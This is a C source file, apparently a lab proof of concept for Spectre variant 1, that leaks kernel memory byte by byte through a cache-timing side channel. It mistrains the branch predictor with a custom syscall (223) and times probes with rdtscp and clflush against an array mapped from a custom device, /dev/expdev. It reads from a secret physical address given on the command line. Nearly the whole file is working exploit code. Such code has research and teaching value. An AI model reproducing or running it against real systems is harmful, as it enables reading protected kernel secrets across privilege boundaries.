
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<linux/kernel.h>
#include<sys/syscall.h>
#include<sys/mman.h>
#include<unistd.h>
#include<fcntl.h>
#include <x86intrin.h> /* for rdtscp and clflush */

#define NUM_CH 256
#define PAGE_SIZE 4096
#define MAX_TRIES 1000
#define TRAIN_TIMES 30
#define ARRAY1_SIZE 16
#define ARRAY2_SIZE NUM_CH * PAGE_SIZE


uint8_t* arr2;

#define CACHE_HIT_THRESHOLD (100)

void readMemoryByte(uint8_t value[2], int score[2], size_t malicious_x, uint8_t* karr2){
    static int results[NUM_CH];
    int tries, i, j, k, mix_i, junk = 0;
    size_t x, training_x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < NUM_CH; i++)
        results[i] = 0;    
    
    for (tries = MAX_TRIES; tries > 0; tries--) {
		for (i = 0; i < NUM_CH; i++) {
			_mm_clflush(&arr2[i * PAGE_SIZE]); /* intrinsic for clflush instruction */
		}

		training_x = tries % ARRAY1_SIZE;
        for(j = TRAIN_TIMES - 1 ; j >= 0 ; --j){
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));
            // Sceptre
            syscall(223, x, karr2);
        }

       for (i = 0; i < NUM_CH; i++) {
            mix_i = ((i * 167) + 13) & (NUM_CH - 1);
            addr = &arr2[mix_i * PAGE_SIZE];
            time1 = __rdtscp(&junk);         /* READ TIMER */
            junk = *addr;                    /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if ((time2 <= CACHE_HIT_THRESHOLD) && (mix_i != (tries % ARRAY1_SIZE) + 1))
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < NUM_CH; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (1.2 * results[k] + 3) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv)
{
    int i;
    int score[2], len = 40;
    uint8_t value[2];
    uint8_t *karr1, *karr2, *secret_ker_vir;
	size_t secret_phy_addr;
    size_t malicious_x;
    int fd;

	if (argc < 3) {
		printf("Not enough argvs\n");
		return -1;
	}

	sscanf(argv[1], "%p", &karr2);
	sscanf(argv[2], "%lx", &secret_phy_addr);

	if (argc >= 4) {
		sscanf(argv[3], "%d", &len);
	}

    fd = open("/dev/expdev", O_RDWR);
    if(fd < 0){
        perror("Fail Open File.\n");
        return -1;
    }
    
    arr2 = mmap(NULL, NUM_CH * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(arr2 == MAP_FAILED){
        perror("Fail to MMAP.\n");
        return -1;
    }

	for (i = 0; i < NUM_CH * PAGE_SIZE; ++i) {
		arr2[i] = 1;	
	}

    karr1 = (uint8_t*)syscall(224, 0);
  	secret_ker_vir = (uint8_t*)syscall(224, secret_phy_addr);

    malicious_x = secret_ker_vir - karr1;
	
	printf("karr1: %p, karr2: %p\n", karr1, karr2);
    printf("secret ker virt: %p\n", secret_ker_vir);


    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(value, score, malicious_x++, karr2);
        printf("%s: ", (score[0] >= 1.2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0],
                (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
    }

    return 0;
}
